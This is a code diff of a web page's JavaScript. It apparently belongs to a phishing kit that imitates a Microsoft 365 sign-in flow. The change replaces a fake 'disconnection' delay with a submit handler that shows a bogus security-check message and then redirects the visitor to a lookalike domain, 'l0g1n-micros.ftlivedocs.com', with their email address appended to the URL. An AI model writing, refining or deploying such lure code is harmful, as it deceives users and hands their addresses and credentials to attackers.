@@ -111,34 +111,24 @@
                 return emailPattern.test(email);
             }
 
-            function simulateDisconnection() {
-                console.log("Simulating disconnection for 10 seconds...");
-
-                setTimeout(() => {
-                    console.log("Reconnecting...");
-
-                    const emailField = document.getElementById("email");
-                    const errorMessage = document.getElementById("errorMessage");
-
-                    if (isValidEmail(emailField.value)) {
-                        const securityCheckMessage = document.querySelector('.security-check');
-                        if (securityCheckMessage) {
-                            securityCheckMessage.style.display = 'block';
-                        }
-
-                        setTimeout(() => {
-                            const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + emailField.value;
-                            console.log("Redirecting to: " + redirectTo);
-                            window.location.href = redirectTo;
-                        }, 6000);
-                    } else {
-                        errorMessage.style.display = 'block';
-                    }
-                }, 10000);
-            }
-
             document.getElementById('submitButton').onclick = function() {
-                simulateDisconnection();
+                const emailField = document.getElementById("email");
+                const errorMessage = document.getElementById("errorMessage");
+                const securityCheckMessage = document.querySelector('.security-check');
+
+                if (isValidEmail(emailField.value)) {
+                    // Show security check message
+                    securityCheckMessage.style.display = 'block';
+
+                    // Redirect after 3 seconds
+                    setTimeout(() => {
+                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + emailField.value;
+                        console.log("Redirecting to: " + redirectTo);
+                        window.location.href = redirectTo;
+                    }, 3000);
+                } else {
+                    errorMessage.style.display = 'block';
+                }
             };
         })();
     </script>
